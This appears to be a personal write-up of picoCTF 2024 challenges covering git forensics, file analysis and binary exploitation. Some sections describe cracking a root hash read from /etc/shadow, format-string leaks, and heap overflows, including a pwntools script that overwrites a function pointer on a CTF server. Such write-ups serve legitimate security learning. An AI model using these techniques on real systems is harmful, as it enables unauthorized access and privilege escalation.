---
title: picoCTF 2024
date: 2024-03-16 00:16:50
tags: 
- [ctf]
categories:
- [picoCTF]
---

# General

## Super SSH

![General](picoCTF2024/General.png)

```bash
ssh ctf-player@titan.picoctf.net -p 63095
```

![General](picoCTF2024/General1.png)

## Commitment Issues

![General](picoCTF2024/General2.png)

After unzipping, we have a  message.txt file with the following message

![General](picoCTF2024/General3.png)

We can run git log to see older commits

![General](picoCTF2024/General4.png)

From this we know that the flag was created in the previous commit

We can change to that commit

```bash
git checkout 87b85d7dfb839b077678611280fa023d76e017b8
```

![General](picoCTF2024/General5.png)

We can now see the flag inside message.txt

![General](picoCTF2024/General6.png)

## Time Machine

![General](picoCTF2024/General7.png)

After unzipping and reading message.txt

![General](picoCTF2024/General8.png)

The flag is in the git log

```bash
git log
```

![General](picoCTF2024/General9.png)

## Blame Game

![General](picoCTF2024/General10.png)

The content of [message.py](http://message.py) is an unfinished command

![General](picoCTF2024/General11.png)

If we run git log, we can see a huge list of commits

Send the output of the git log command to a .txt file

```bash
git log > output.txt
```

If we cat the output now, we can see the flag in the author name of one of the earliest commits

![General](picoCTF2024/General12.png)

## Collaborative Development

![General](picoCTF2024/General13.png)

[flag.py](http://flag.py) content

![General](picoCTF2024/General14.png)

If we list all branches, we can see different branches, related to different parts

```bash
git branch -a
```

![General](picoCTF2024/General15.png)

We can use git diff to see all the differences in the branches, and each part has a part of the flag

```bash
git diff feature/part-1 feature/part-2 feature/part-3
```

![General](picoCTF2024/General16.png)

## binhexa

![General](picoCTF2024/General17.png)

In this challenge we need to answer a bunch of questions related to binary operations, the numbers are random every time
I used this [binary calculator](https://www.rapidtables.com/calc/math/binary-calculator.html)

![General](picoCTF2024/General18.png)

## Binary Search

![General](picoCTF2024/General19.png)

In this challenge, the best strategy is to keep finding the median in between guesses

![General](picoCTF2024/General20.png)

## endianness

![General](picoCTF2024/General21.png)

For this challenge I used a python script to convert ASCII to little and big endian, just change the input_string 

```python
def ascii_to_little_endian(input_string):
    # Convert the input string to ASCII bytes
    ascii_bytes = input_string.encode('ascii')
    
    # Convert ASCII bytes to little endian hexadecimal representation
    little_endian_hex = ''.join(format(byte, '02x') for byte in reversed(ascii_bytes))
    
    return little_endian_hex

def ascii_to_big_endian(input_string):
    # Convert the input string to ASCII bytes
    ascii_bytes = input_string.encode('ascii')
    
    # Convert ASCII bytes to big endian hexadecimal representation
    big_endian_hex = ''.join(format(byte, '02x') for byte in ascii_bytes)
    
    return big_endian_hex

# Example usage for little endian:
input_string = "lopmo"
little_endian_hex = ascii_to_little_endian(input_string)
print("Little Endian Hexadecimal Representation:", little_endian_hex)

# Example usage for big endian:
big_endian_hex = ascii_to_big_endian(input_string)
print("Big Endian Hexadecimal Representation:", big_endian_hex)

```

![General](picoCTF2024/General22.png)

## dont-you-love-banners

![General](picoCTF2024/General23.png)

We can use nc to see what information is leaking, and we can see a password

![General](picoCTF2024/General24.png)

We can use this password to connect to the application

The other two questions are easily googled

![General](picoCTF2024/General25.png)

We are now in a shell as the user player, and in it’s home directory we have a text file


![General](picoCTF2024/General27.png)

We have access to the /root directory, but no permission to read flag.txt

![General](picoCTF2024/General28.png)

However we have access to the /etc/shadow file

![General](picoCTF2024/General29.png)

We can crack the root’s hash

![General](picoCTF2024/General30.png)

![General](picoCTF2024/General31.png)

Now just change user to root and cat the flag.txt

![General](picoCTF2024/General32.png)



# Binary Exploitation

## format string 0

![Binary](picoCTF2024/Binary.png)

This one is very simple, we can spam the %p parameter

![Binary](picoCTF2024/Binary1.png)

![Binary](picoCTF2024/Binary2.png)

## heap 0

![Binary](picoCTF2024/Binary3.png)

For this challenge, in the source code, the check_win function just compares the safe_var variable to the string “bico”, if the safe_var variable is not equal to “bico” the code runs.
So we just need to overflow the stack until the safe_var variable is not equal to “bico”

We can just spam A’s and safe_var will be overwritten

![Binary](picoCTF2024/Binary4.png)

![Binary](picoCTF2024/Binary5.png)

![Binary](picoCTF2024/Binary6.png)

## heap 1

![Binary](picoCTF2024/Binary7.png)

Looking at the source code, this is very similar to the previous challenge, however, this time the check_win() function will only run if safe_var is equal to “pico”

![Binary](picoCTF2024/Binary8.png)

To find the point in which the safe_var starts being overwritten, I created a 50 character pattern

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
```

![Binary](picoCTF2024/Binary9.png)

With this pattern, we can see that safe_var starts being overwritten in 0Ab1

So we just need to replace 0Ab1Ab2Ab3Ab4Ab5Ab with “pico”

![Binary](picoCTF2024/Binary10.png)

Now just use option 4 to print the flag

![Binary](picoCTF2024/Binary11.png)

## heap 2

![Binary](picoCTF2024/Binary12.png)

This time the function check_win() dereferences a pointer (x), assumes that the value stored at that memory address is the address of a function

![Binary](picoCTF2024/Binary13.png)

So we first need to find where x starts being overwritten, and then write the address of the win() function

![Binary](picoCTF2024/Binary14.png)

Find where x starts being overwritten

![Binary](picoCTF2024/Binary15.png)

x starts being overwritten after 32 chars

Then I used pwndbg to find the win() function address

![Binary](picoCTF2024/Binary16.png)

The memory address for the win() function is 0x4011a0

Then I made a python script to send 32 chars, and then the memory address for the win() function

```python
from pwn import *

# Connect to the remote host and port
host = 'mimas.picoctf.net'
port = 61553
p = remote(host, port)

# Pause to allow time for the binary to start up
pause()

# Select option 2 to write to the buffer
p.sendline('2')

# Send the payload to trigger buffer overflow
payload = b"A" * 32 + b"\xa0\x11\x40"
p.sendline(payload)

# Select option 4 to print the flag
p.sendline('4')

# Receive and print the flag
print(p.recvuntil('}').decode())

```

![Binary](picoCTF2024/Binary17.png)

# Forensics

## Scan Surprise

![Forensics](picoCTF2024/Forensics.png)

After unzipping, we have a flag.png file that contains a QR code

![Forensics](picoCTF2024/Forensics1.png)

We just need to scan it for the flag

![Forensics](picoCTF2024/Forensics2.png)

## Verify

![Forensics](picoCTF2024/Forensics3.png)

In this challenge, ssh into the machine and cat checksum.txt

![Forensics](picoCTF2024/Forensics4.png)

This is the sha256 checksum of the file we need to find

In the files directory we have a huge list of files

![Forensics](picoCTF2024/Forensics5.png)

We just need to check the sha256 hash of all the files, and grep the one we want from the checksum.txt

```bash
sha256sum * | grep "fba9f49bf22aa7188a155768ab0dfdc1f9b86c47976cd0f7c9003af2e20598f7"
```

![Forensics](picoCTF2024/Forensics6.png)

We now just run the [decrypt.sh](http://decrypt.sh) with this file

![Forensics](picoCTF2024/Forensics7.png)

## CanYouSee

![Forensics](picoCTF2024/Forensics8.png)

For this challenge, we just have a .jpg file

The image gives us nothing

![Forensics](picoCTF2024/Forensics9.png)

I went to look for the magic bytes by using head, and ended up finding a base64 encoded string

```bash
cat ukn_reality.jpg | head
```

![Forensics](picoCTF2024/Forensics10.png)

We can just decode this

![Forensics](picoCTF2024/Forensics11.png)

## Secret of the Polyglot

![Forensics](picoCTF2024/Forensics12.png)

In this challenge, we have a pdf file, and if we open it, we can see the second half of the flag

![Forensics](picoCTF2024/Forensics13.png)

If we look at the file’s magic bytes,  we will find the PNG magic bytes

![Forensics](picoCTF2024/Forensics14.png)

Just change the extension to .png and open it

![Forensics](picoCTF2024/Forensics15.png)

We now have the first half of the flag too

![Forensics](picoCTF2024/Forensics16.png)

## Mob psycho

![Forensics](picoCTF2024/Forensics17.png)

This challenge gives us an apk file
We can unzip apk files, after unzipping we are left with a lot of files to search through

![Forensics](picoCTF2024/Forensics18.png)

I ended up finding a flag.txt file

```bash
find . -type f -name "*flag*"
```

![Forensics](picoCTF2024/Forensics19.png)

![Forensics](picoCTF2024/Forensics20.png)

Convert from hex and we get the flag

![Forensics](picoCTF2024/Forensics21.png)